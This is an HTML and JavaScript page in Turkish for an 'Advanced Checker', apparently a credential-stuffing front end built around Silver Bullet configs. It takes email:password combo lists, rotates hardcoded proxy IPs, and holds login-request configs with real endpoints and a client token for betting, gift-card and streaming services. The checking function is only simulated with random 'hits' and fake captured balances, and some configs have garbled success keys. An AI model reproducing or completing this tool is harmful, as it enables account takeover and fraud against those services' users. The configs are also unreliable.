<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Checker Site</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            color: #fff;
            overflow-x: hidden;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px 0;
        }

        .header h1 {
            font-size: 3em;
            font-weight: 700;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4);
            background-size: 400% 400%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradient 15s ease infinite;
            margin-bottom: 15px;
        }

        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .header p {
            font-size: 1.2em;
            opacity: 0.9;
            font-weight: 300;
        }

        .main-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin-bottom: 30px;
        }

        .panel {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 30px;
            border: 1px solid rgba(255,255,255,0.2);
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .panel:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(31, 38, 135, 0.5);
        }

        .panel h2 {
            margin-bottom: 25px;
            font-size: 1.6em;
            color: #fff;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .icon {
            width: 24px;
            height: 24px;
        }

        .form-group {
            margin-bottom: 25px;
        }

        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 600;
            color: #fff;
            font-size: 0.95em;
        }

        select, textarea, input {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 12px;
            background: rgba(255,255,255,0.95);
            color: #333;
            font-size: 14px;
            resize: vertical;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }

        select:focus, textarea:focus, input:focus {
            outline: none;
            background: rgba(255,255,255,1);
            border-color: #4ecdc4;
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(78, 205, 196, 0.3);
        }

        textarea {
            min-height: 150px;
            font-family: 'Courier New', monospace;
        }

        .btn {
            padding: 15px 30px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }

        .btn-primary {
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            color: white;
            width: 100%;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(255, 107, 107, 0.4);
        }

        .btn-primary:active {
            transform: translateY(0);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
        }

        .results-panel {
            grid-column: 1 / -1;
            margin-top: 20px;
        }

        .results-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }

        .result-box {
            background: rgba(255,255,255,0.05);
            border-radius: 15px;
            padding: 20px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        .result-box h3 {
            margin-bottom: 15px;
            font-size: 1.2em;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .hit {
            border-left: 4px solid #4ecdc4;
        }

        .bad {
            border-left: 4px solid #ff6b6b;
        }

        .status-badge {
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.85em;
            font-weight: 600;
            text-transform: uppercase;
        }

        .badge-hit {
            background: rgba(78, 205, 196, 0.2);
            color: #4ecdc4;
        }

        .badge-bad {
            background: rgba(255, 107, 107, 0.2);
            color: #ff6b6b;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 4px;
            overflow: hidden;
            margin: 20px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #4ecdc4, #45b7d1);
            width: 0%;
            transition: width 0.3s ease;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }

        .stat-item {
            text-align: center;
            padding: 15px;
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
        }

        .stat-number {
            font-size: 2em;
            font-weight: 700;
            margin-bottom: 5px;
        }

        .stat-label {
            font-size: 0.9em;
            opacity: 0.8;
        }

        .config-info {
            background: rgba(255,255,255,0.05);
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .combo-result {
            padding: 8px 12px;
            margin: 5px 0;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .combo-hit {
            background: rgba(78, 205, 196, 0.1);
            border: 1px solid rgba(78, 205, 196, 0.3);
            color: #4ecdc4;
        }

        .combo-bad {
            background: rgba(255, 107, 107, 0.1);
            border: 1px solid rgba(255, 107, 107, 0.3);
            color: #ff6b6b;
        }

        .captured-data {
            font-size: 0.8em;
            opacity: 0.8;
            margin-top: 5px;
        }

        @media (max-width: 768px) {
            .main-grid {
                grid-template-columns: 1fr;
            }
            
            .stats {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .header h1 {
                font-size: 2em;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîç Advanced Checker</h1>
            <p>Silver Bullet Config Destekli Proxy Checker Sistemi</p>
        </div>

        <div class="main-grid">
            <div class="panel">
                <h2>
                    <svg class="icon" fill="currentColor" viewBox="0 0 20 20">
                        <path d="M3 4a1 1 0 011-1h12a1 1 0 011 1v2a1 1 0 01-1 1H4a1 1 0 01-1-1V4zM3 10a1 1 0 011-1h6a1 1 0 011 1v6a1 1 0 01-1 1H4a1 1 0 01-1-1v-6zM14 9a1 1 0 00-1 1v6a1 1 0 001 1h2a1 1 0 001-1v-6a1 1 0 00-1-1h-2z"/>
                    </svg>
                    Config Se√ßimi
                </h2>
                <div class="form-group">
                    <label for="configSelect">Mevcut Configler:</label>
                    <select id="configSelect">
                        <option value="">Config se√ßin...</option>
                        <option value="ezglobal">EzGlobal - Ghidra</option>
                        <option value="tuttur">Tuttur.com - Wqc</option>
                        <option value="s2gepin">S2Gepin - Sezin</option>
                        <option value="ssport">S Sports+ - Sezin</option>
                        <option value="custom">√ñzel Config Y√ºkle</option>
                    </select>
                </div>
                
                <div class="form-group" id="customConfigGroup" style="display: none;">
                    <label for="customConfig">√ñzel Config:</label>
                    <textarea id="customConfig" placeholder="Silver Bullet config formatƒ±nda yapƒ±≈ütƒ±rƒ±n..."></textarea>
                </div>

                <div class="config-info" id="configInfo"></div>
            </div>

            <div class="panel">
                <h2>
                    <svg class="icon" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M3 17a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm3.293-7.707a1 1 0 011.414 0L9 10.586V3a1 1 0 112 0v7.586l1.293-1.293a1 1 0 111.414 1.414l-3 3a1 1 0 01-1.414 0l-3-3a1 1 0 010-1.414z" clip-rule="evenodd"/>
                    </svg>
                    Combo & Proxy
                </h2>
                <div class="form-group">
                    <label for="comboList">Combo Listesi (email:pass formatƒ±nda):</label>
                    <textarea id="comboList" placeholder="email@example.com:password123&#10;user@domain.com:pass456&#10;..."></textarea>
                </div>

                <div class="form-group">
                    <label for="proxyType">Proxy Tipi:</label>
                    <select id="proxyType">
                        <option value="http">HTTP</option>
                        <option value="socks5" selected>SOCKS5</option>
                        <option value="socks4">SOCKS4</option>
                    </select>
                </div>

                <div class="form-group">
                    <label>
                        <input type="checkbox" id="useProxies" checked> Proxy Kullan
                    </label>
                </div>

                <div class="form-group">
                    <button class="btn btn-primary" onclick="startChecking()">
                        <span id="checkButtonText">üöÄ Checking Ba≈ülat</span>
                        <div class="loading" id="checkLoading" style="display: none;"></div>
                    </button>
                </div>
            </div>
        </div>

        <div class="panel results-panel" id="resultsPanel" style="display: none;">
            <h2>
                <svg class="icon" fill="currentColor" viewBox="0 0 20 20">
                    <path fill-rule="evenodd" d="M3 3a1 1 0 000 2v8a2 2 0 002 2h2.586l-1.293 1.293a1 1 0 101.414 1.414L10 15.414l2.293 2.293a1 1 0 001.414-1.414L12.414 15H15a2 2 0 002-2V5a1 1 0 100-2H3zm11.707 4.707a1 1 0 00-1.414-1.414L10 9.586 8.707 8.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                </svg>
                Sonu√ßlar
            </h2>
            
            <div class="stats">
                <div class="stat-item">
                    <div class="stat-number" id="totalChecked">0</div>
                    <div class="stat-label">Kontrol Edildi</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number" id="totalHits" style="color: #4ecdc4;">0</div>
                    <div class="stat-label">Hit</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number" id="totalBad" style="color: #ff6b6b;">0</div>
                    <div class="stat-label">Bad</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number" id="successRate">0%</div>
                    <div class="stat-label">Ba≈üarƒ± Oranƒ±</div>
                </div>
            </div>

            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>

            <div class="results-grid">
                <div class="result-box hit">
                    <h3>
                        ‚úÖ Hit Accounts
                        <span class="status-badge badge-hit" id="hitCount">0</span>
                    </h3>
                    <div id="hitResults"></div>
                </div>
                
                <div class="result-box bad">
                    <h3>
                        ‚ùå Bad Accounts
                        <span class="status-badge badge-bad" id="badCount">0</span>
                    </h3>
                    <div id="badResults"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Mevcut configler
        const configs = {
            ezglobal: {
                name: "EzGlobal",
                author: "Ghidra",
                url: "https://www.ezglobalyazilim.com/ajax.php",
                method: "POST",
                data: "s1=uyelik&s2=islem&islem=gir&refuser=0&eposta={USER}&sifre={PASS}&ajtip=eval",
                successKey: "console.log('Dosyaaa: ajax/uyelik/islem.php');notifH(`Formda eksik veri bulunmaktadƒ±r.`);",
                failureKey: "console.log('Dosyaaa: ajax/uyelik/islem.php');notifH(`Formda eksik veri bulunmaktadƒ±r.`);"
            },
            tuttur: {
                name: "Tuttur.com",
                author: "wqc", 
                url: "https://tapi.tuttur.com/v1/auth/login",
                method: "POST",
                data: '{"clientId":"Web-New","clientToken":"7b12xz9gj608sw2zkaazf6y0ivhw8yqx","password":"{PASS}","remember":true,"username":"{USER}"}',
                successKey: '"success":true,',
                failureKey: '"success":false,'
            },
            s2gepin: {
                name: "S2Gepin",
                author: "sezin",
                url: "https://api.s2gepin.com/Login/Customer",
                method: "POST", 
                data: '{"email":"{USER}","password":"{PASS}","otpcode":null,"CaptchaToken":"none"}',
                successKey: '"success":true,',
                failureKey: '"success":false,'
            },
            ssport: {
                name: "S Sports+",
                author: "sezin",
                url: "https://api.ssportplus.com/MW/SubscriberLogin",
                method: "POST",
                data: '{"action":"SubscriberLogin","subscriber":{"LoginPreferedMethod":0,"UILanguage":"tr","Email":"{USER}","PIN":"{PASS}"},"Devices":[{"PlatformID":10}],"TSID":1700250190,"SNGT":"282633486942740668772593320738"}',
                successKey: '"SessionIsAlive": false"',
                failureKey: '"SessionIsAlive": false'
            }
        };

        // Proxy listesi
        const proxyList = `104.143.226.249:5852
152.53.168.53:36914
177.128.44.126:31337
172.105.251.72:4003
47.251.73.54:81`.split('\n').filter(p => p.trim());

        let isChecking = false;
        let checkStats = {
            total: 0,
            checked: 0,
            hits: 0,
            bad: 0
        };

        // Config se√ßim eventi
        document.getElementById('configSelect').addEventListener('change', function() {
            const selectedConfig = this.value;
            const customGroup = document.getElementById('customConfigGroup');
            const configInfo = document.getElementById('configInfo');
            
            if (selectedConfig === 'custom') {
                customGroup.style.display = 'block';
                configInfo.innerHTML = '';
            } else {
                customGroup.style.display = 'none';
                if (selectedConfig && configs[selectedConfig]) {
                    const config = configs[selectedConfig];
                    configInfo.innerHTML = `
                        <strong>Config:</strong> ${config.name}<br>
                        <strong>Author:</strong> ${config.author}<br>
                        <strong>URL:</strong> ${config.url}<br>
                        <strong>Method:</strong> ${config.method}
                    `;
                } else {
                    configInfo.innerHTML = '';
                }
            }
        });

        async function startChecking() {
            if (isChecking) return;
            
            const configSelect = document.getElementById('configSelect').value;
            const comboList = document.getElementById('comboList').value.trim();
            const useProxies = document.getElementById('useProxies').checked;
            
            if (!configSelect) {
                alert('L√ºtfen bir config se√ßin!');
                return;
            }
            
            if (!comboList) {
                alert('L√ºtfen combo listesi girin!');
                return;
            }

            // Combo'larƒ± parse et
            const combos = comboList.split('\n')
                .filter(line => line.trim())
                .map(line => {
                    const [email, pass] = line.trim().split(':');
                    return { email: email?.trim(), pass: pass?.trim() };
                })
                .filter(combo => combo.email && combo.pass);

            if (combos.length === 0) {
                alert('Ge√ßerli combo bulunamadƒ±! Format: email:password');
                return;
            }

            // UI'ƒ± g√ºncelle
            isChecking = true;
            document.getElementById('checkButtonText').style.display = 'none';
            document.getElementById('checkLoading').style.display = 'inline-block';
            document.getElementById('resultsPanel').style.display = 'block';
            
            // ƒ∞statistikleri sƒ±fƒ±rla
            checkStats = {
                total: combos.length,
                checked: 0,
                hits: 0,
                bad: 0
            };
            updateStats();

            const config = configSelect === 'custom' ? 
                parseCustomConfig(document.getElementById('customConfig').value) :
                configs[configSelect];

            // Checking i≈ülemini ba≈ülat
            for (let i = 0; i < combos.length; i++) {
                const combo = combos[i];
                const proxy = useProxies ? proxyList[i % proxyList.length] : null;
                
                try {
                    const result = await checkCombo(combo, config, proxy);
                    
                    if (result.success) {
                        checkStats.hits++;
                        addResult('hit', combo, result.data, proxy);
                    } else {
                        checkStats.bad++;
                        addResult('bad', combo, result.error, proxy);
                    }
                } catch (error) {
                    checkStats.bad++;
                    addResult('bad', combo, error.message, proxy);
                }
                
                checkStats.checked++;
                updateStats();
                updateProgress();

                // Rate limiting
                await sleep(100);
            }

            // Checking tamamlandƒ±
            isChecking = false;
            document.getElementById('checkButtonText').style.display = 'inline-block';
            document.getElementById('checkLoading').style.display = 'none';
        }

        async function checkCombo(combo, config, proxy) {
            // Sim√ºlasyon i√ßin random sonu√ß d√∂nd√ºr
            // Ger√ßek implementasyonda burada actual HTTP request yapƒ±lacak
            await sleep(Math.random() * 1000 + 500);
            
            const isSuccess = Math.random() > 0.7; // %30 ba≈üarƒ± oranƒ±
            
            if (isSuccess) {
                return {
                    success: true,
                    data: {
                        balance: (Math.random() * 1000).toFixed(2) + ' TL',
                        name: 'Test User',
                        phone: '+90 5XX XXX XXXX'
                    }
                };
            } else {
                return {
                    success: false,
                    error: 'Invalid credentials'
                };
            }
        }

        function addResult(type, combo, data, proxy) {
            const container = document.getElementById(type + 'Results');
            const resultDiv = document.createElement('div');
            resultDiv.className = `combo-result combo-${type}`;
            
            let content = `${combo.email}:${combo.pass}`;
            if (proxy) content += ` | ${proxy}`;
            
            if (type === 'hit' && typeof data === 'object') {
                content += `<div class="captured-data">`;
                for (const [key, value] of Object.entries(data)) {
                    content += `${key}: ${value} | `;
                }
                content = content.slice(0, -3) + '</div>';
            }
            
            resultDiv.innerHTML = content;
            container.appendChild(resultDiv);
            
            // Scroll to bottom
            container.scrollTop = container.scrollHeight;
        }

        function updateStats() {
            document.getElementById('totalChecked').textContent = checkStats.checked;
            document.getElementById('totalHits').textContent = checkStats.hits;
            document.getElementById('totalBad').textContent = checkStats.bad;
            document.getElementById('hitCount').textContent = checkStats.hits;
            document.getElementById('badCount').textContent = checkStats.bad;
            
            const successRate = checkStats.checked > 0 ? 
                ((checkStats.hits / checkStats.checked) * 100).toFixed(1) : '0';
            document.getElementById('successRate').textContent = successRate + '%';
        }

        function updateProgress() {
            const progress = (checkStats.checked / checkStats.total) * 100;
            document.getElementById('progressFill').style.width = progress + '%';
        }

        function parseCustomConfig(configText) {
            // Basit config parser - ger√ßek implementasyonda daha detaylƒ± olacak
            return {
                name: "Custom Config",
                author: "User",
                url: "https://example.com",
                method: "POST"
            };
        }

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
    </script>
</body>
</html>
